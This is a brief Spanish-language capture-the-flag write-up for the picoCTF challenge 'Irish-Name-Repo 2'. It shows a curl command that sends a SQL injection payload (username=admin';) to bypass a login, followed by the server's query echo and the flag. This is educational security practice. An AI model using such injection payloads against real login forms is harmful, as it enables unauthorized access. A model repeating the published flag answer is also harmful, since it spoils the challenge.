# Irish-Name-Repo 2

## Descripcion
There is a website running at `https://jupiter.challenges.picoctf.org/problem/64649/` ([link](https://jupiter.challenges.picoctf.org/problem/64649/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:64649

## Pistas
- The password is being filtered.

## Solución

```
eltetor14-picoctf@webshell:~$ curl -s  https://jupiter.challenges.picoctf.org/problem/64649/login.php -d "username=admin';&password=hola&debug=1"
<pre>username: admin';
password: hola
SQL query: SELECT * FROM users WHERE name='admin';' AND password='hola'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_aee925db}</p>eltetor14-picoctf@webshell:~$
```

## Bandera
picoCTF{m0R3_SQL_plz_aee925db}

## Notas adicionales
https://www.w3schools.com/sql/sql_injection.asp

## Referencias